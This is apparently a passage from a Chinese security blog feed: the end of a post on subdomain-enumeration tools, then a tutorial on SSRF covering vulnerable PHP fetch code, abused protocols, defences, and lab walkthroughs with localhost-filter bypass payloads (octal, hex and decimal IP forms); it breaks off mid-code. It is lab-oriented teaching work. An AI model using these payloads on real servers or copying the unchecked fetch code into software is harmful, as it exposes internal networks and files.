v5.3.0<br>下载地址：<a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> ,通过字典攻击快速枚举目标域上的子域</p><h5 id="one-for-all-1"><a href="#one-for-all-1" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> </p><blockquote><p>OneForAll基于Python 3.6.0开发和测试，OneForAll需要高于Python 3.6.0的版本才能运行。 安装Python环境可以参考Python 3 安装指南。运行以下命令检查Python和pip3版本：<br>首先下载并编辑配置文件，添加自己的api和个性化设置，并保留原始文件结构<br>config ├ ── api.py ├ ── log.py └── setting.py<br>拉取镜像并执行，其中<del>/.config替换为你自己配置文件所在文件夹的路径<br>docker pull shmilylty/oneforall<br>docker run -it –rm -v ~/results:/OneForAll/results -v ~/.config:/OneForAll/config shmilylty/oneforall –target example.com run<br>参数直接加在指令末尾，结果会输出在本地目录</del>/results，如需保存到其他位置，可以自行修改。<br>如果你是通过pip3安装的依赖则使用以下命令运行示例：<br>python3 oneforall.py –target example.com run<br>python3 oneforall.py –targets ./example.txt run</p></blockquote><h3 id="三、实战演练"><a href="#三、实战演练" class="headerlink" title="三、实战演练"></a>三、实战演练</h3><h3 id="四、总结答疑"><a href="#四、总结答疑" class="headerlink" title="四、总结答疑"></a>四、总结答疑</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞原理攻击与防御</title>
      <link href="/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF漏洞原理攻击与防御"><a href="#SSRF漏洞原理攻击与防御" class="headerlink" title="SSRF漏洞原理攻击与防御"></a>SSRF漏洞原理攻击与防御</h2><blockquote><p style="color:red;">前言：笔者对SSRF的进一步研究学习基于网络安全爱好者的兴趣，与白帽黑客的责任，仅在专业靶场和补天平台授权站点进行测试。</p></blockquote><p>[TOC]</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个漏洞</p><h3 id="一、SSRF漏洞原理："><a href="#一、SSRF漏洞原理：" class="headerlink" title="一、SSRF漏洞原理："></a>一、SSRF漏洞原理：</h3><blockquote><p style="color:blue;"> SSRF漏洞 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p></blockquote><center> <img src="https://img-blog.csdnimg.cn/b53de209637a4a88853e1762d639b5d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" style="zoom: 67%;" /></center> #### 1.1 SSRF危害<p>端口扫描、内网web应用指纹识别、攻击内网web应用、读取本地文件</p><h3 id="二、SSRF漏洞挖掘"><a href="#二、SSRF漏洞挖掘" class="headerlink" title="二、SSRF漏洞挖掘:"></a>二、SSRF漏洞挖掘:</h3><p>互联网上的很多web应用提供了从其他服务器获取数据的功能。使用用户指定的URL，web应用可以获取图片、文件资源。可以说如果链接可以访问任意请求，则存在ssrf漏洞</p><h4 id="2-1-SSRF可能产生的方式："><a href="#2-1-SSRF可能产生的方式：" class="headerlink" title="2.1 SSRF可能产生的方式："></a>2.1 SSRF可能产生的方式：</h4><ul><li><p> 分享：通过URL地址分享网页内容 </p></li><li><p>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p></li><li><p>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示。</p><blockquote><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p></blockquote><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p></li><li><p>图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。 </p></li><li><p>从URL关键字中寻找，可以通过谷歌语法通过关键字寻找 SSRF漏洞</p><blockquote><p> share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain</p></blockquote></li></ul><h4 id="2-2-PHP中可能产生SSRF漏洞的函数："><a href="#2-2-PHP中可能产生SSRF漏洞的函数：" class="headerlink" title="2.2 PHP中可能产生SSRF漏洞的函数："></a>2.2 PHP中可能产生SSRF漏洞的函数：</h4><p><strong>file_get_contents:</strong>     file_get_contents() 把整个文件读入一个字符串中。</p><blockquote><p style="color:red;">file_get_contents(path,include_path,context,start,max_length)</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">#下面的代码使用file_get_contents函数从用户指定的url获取图片。#然后把它用一个随即文件名保存在硬盘上，并展示给用户。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token string single-quoted-string">'./images/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">';img1.jpg'</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;img src=\""</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"\"/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>sockopen():</strong>     使用socket跟服务器建立tcp连接，传输原始数据。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># 以下代码使用fsockopen函数实现获取用户制定url的数据# 这个函数会使用socket跟服务器建立tcp连接，传输原始数据。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (error number <span class="token interpolation"><span class="token variable">$errno</span></span>) \n"</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GET <span class="token interpolation"><span class="token variable">$link</span></span> HTTP/1.1\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Host: <span class="token interpolation"><span class="token variable">$host</span></span>\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>             <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>             <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token operator">.=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、curl_exec():</strong> curl_exec — 执行一个cURL会话</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 详细注释版本见web351</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-相关协议"><a href="#2-4-相关协议" class="headerlink" title="2.4 相关协议"></a>2.4 相关协议</h4><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>http/s协议：探测内网主机存活</p><h3 id="三、SSRF利用"><a href="#三、SSRF利用" class="headerlink" title="三、SSRF利用:"></a>三、SSRF利用:</h3><blockquote><p style="color:blue;">可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<p style="color:blue;">攻击运行在内网或本地的应用程序（比如溢出）;<p style="color:blue;">对内网web应用进行指纹识别，通过访问默认文件实现;<p style="color:blue;">攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;<p style="color:blue;">利用file协议读取本地文件等。各个协议调用探针：http,file,dict,ftp,gopher等</blockquote><h3 id="四、SSRF漏洞防御："><a href="#四、SSRF漏洞防御：" class="headerlink" title="四、SSRF漏洞防御："></a>四、SSRF漏洞防御：</h3><p>通常有以下5个思路：</p><ol><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p></li><li><p>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p></li><li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p></li></ol><h3 id="五、SSRF漏洞常见绕过方式："><a href="#五、SSRF漏洞常见绕过方式：" class="headerlink" title="五、SSRF漏洞常见绕过方式："></a>五、SSRF漏洞常见绕过方式：</h3><h4 id="5-1-采用短网址绕过-amp-采用进制转换"><a href="#5-1-采用短网址绕过-amp-采用进制转换" class="headerlink" title="5.1 采用短网址绕过 &amp; 采用进制转换"></a>5.1 采用短网址绕过 &amp; 采用进制转换</h4><blockquote><p style="color:blue;">采用短网址进行绕过和进制转化绕过都是非常经典的方式，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote><h5 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//初始化一个cURL会话</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设定返回信息中包含响应信息头</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//启用时会将头文件的信息作为数据流输出。 </span><span class="token comment">//参数为1表示输出信息头,为0表示不输出</span><span class="token comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//参数为1表示$result,为0表示echo $result</span><span class="token comment">//执行一个cURL会话</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭一个curl会话</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个flag.php，直接访问给了提示，非本地用户无法访问， 要让我们以本地用户去访问127.0.0.1/flag.php </p><blockquote><p style="color:blue;">url=http://127.0.0.1/flag.php</p></blockquote><h5 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 进行了过滤，过滤掉了localhost和127.0.0.*</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//启用时会将头文件的信息作为数据流输出</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">url=http://0x7F.0.0.1/flag.php   16进制</p><p style="color:blue;">url=http://0177.0.0.1/flag.php    8进制</p><p style="color:blue;">url=http://0.0.0.0/flag.php</p><p style="color:blue;">url=http://0/flag.php</p><p style="color:blue;">url=http://127.127.127.127/flag.php</p></blockquote><h5 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里过滤了。数字127等，我们不能利用句号或者短网址进行绕过</span>            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>十六进制 url=<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>八进制 url=<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>10 进制整数格式 url=<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>16 进制整数格式 url=<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a><br>短网址方式：127.0.0.1也可以写成127.1<br>用CIDR绕过localhost<br>url=<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a><br>url=<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url=<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p></blockquote><h5 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token 